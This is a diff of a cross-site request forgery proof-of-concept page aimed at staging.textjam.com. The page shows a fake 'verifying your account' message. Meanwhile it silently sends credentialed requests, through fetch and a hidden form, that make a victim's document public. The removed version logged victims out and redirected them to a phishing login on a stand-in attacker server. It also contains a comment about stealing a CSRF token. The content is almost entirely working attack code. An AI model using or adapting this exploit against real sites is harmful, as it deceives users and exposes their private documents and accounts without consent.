@@ -30,22 +30,22 @@
     function performAttack() {
         document.getElementById('status').innerHTML = "Verifying your account...";
         
-        // Perform stealth logout CSRF
-        fetch('https://staging.textjam.com/api/auth/logout', {
+        // Perform stealth CSRF to make document public
+        fetch('https://staging.textjam.com/api/doc/U5B1D57H/access/public/viewer', {
             method: 'POST',
             credentials: 'include',  // Send cookies
             mode: 'no-cors',         // Avoid CORS issues
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify({action: 'logout'})
+            body: JSON.stringify({})  // Empty object like logout
         })
         .then(() => {
             document.getElementById('status').innerHTML = "✅ Account verified! Redirecting...";
             
-            // Redirect to phishing page after logout
+            // Redirect to document after making it public
             setTimeout(() => {
-                window.location.href = "https://staging.textjam.com/login?message=Session+expired+please+login+again";
+                window.location.href = "https://staging.textjam.com/doc/U5B1D57H?message=Document+now+public";
             }, 1500);
         })
         .catch(error => {
@@ -58,21 +58,15 @@
         // Alternative: Form submission method
         var form = document.createElement('form');
         form.method = 'POST';
-        form.action = 'https://staging.textjam.com/api/auth/logout';
+        form.action = 'https://staging.textjam.com/api/doc/U5B1D57H/access/public/viewer';
         form.style.display = 'none';
         
-        // Try to include CSRF token if we can steal it
-        var csrfInput = document.createElement('input');
-        csrfInput.type = 'hidden';
-        csrfInput.name = 'csrf_token';
-        csrfInput.value = 'attacker_token'; // Would need real token
-        
-        form.appendChild(csrfInput);
+        // No inputs needed for this endpoint
         document.body.appendChild(form);
         form.submit();
         
         setTimeout(() => {
-            window.location.href = "https://attacker-server.com/phishing-login";
+            window.location.href = "https://staging.textjam.com/doc/U5B1D57H";
         }, 1000);
     }
     </script>
